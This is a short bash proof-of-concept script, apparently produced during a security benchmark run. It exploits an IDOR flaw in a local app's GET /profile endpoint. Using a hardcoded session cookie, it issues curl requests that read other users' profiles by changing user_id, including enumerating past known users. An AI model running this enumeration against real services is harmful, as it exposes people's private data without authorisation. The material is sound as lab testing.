#!/bin/bash
# POC: Demonstrates IDOR vulnerability in GET /profile endpoint allowing unauthorized read access to other users' profile data
# Target: ./repo
# Created: 2025-11-07T17:04:28.498Z
# Session: benchmark-XBEN-063-24-mhp3aptq

# IDOR Vulnerability POC - Profile Retrieval (GET Request)
# Demonstrates unauthorized read access to other users' profile data via user_id parameter

TARGET_URL="${1:-http://localhost:5000}"
SESSION_COOKIE="${2:-eyJ1c2VyX2lkIjoxfQ.aQ4l0g.OxTuOwTc1H4L-9rmwFYE9Q-OOFE}"

echo "[*] IDOR POC - Profile Retrieval via GET Request"
echo "[*] Target: $TARGET_URL"
echo "[*] Using session cookie: ${SESSION_COOKIE:0:20}..."
echo ""

# Function to retrieve a user's profile
get_profile() {
    local user_id=$1
    echo "[*] Attempting to retrieve profile for user_id=$user_id..."
    
    response=$(curl -s -X GET \
        "$TARGET_URL/profile?user_id=$user_id" \
        -H "Cookie: session=$SESSION_COOKIE" \
        -H "Content-Type: application/json")
    
    echo "[+] Response:"
    echo "$response" | python3 -m json.tool 2>/dev/null || echo "$response"
    echo ""
}

# Test 1: Retrieve user 2's profile
echo "=== TEST 1: Retrieve User 2's Profile ==="
get_profile 2

# Test 2: Retrieve user 1's profile
echo "=== TEST 2: Retrieve User 1's Profile ==="
get_profile 1

# Test 3: Retrieve user 3's profile
echo "=== TEST 3: Retrieve User 3's Profile ==="
get_profile 3

# Test 4: Attempt to retrieve user 999's profile (enumerate beyond known users)
echo "=== TEST 4: Attempt to Retrieve User 999's Profile (Enumeration) ==="
get_profile 999

echo "[+] POC Complete - IDOR vulnerability allows reading arbitrary user profiles"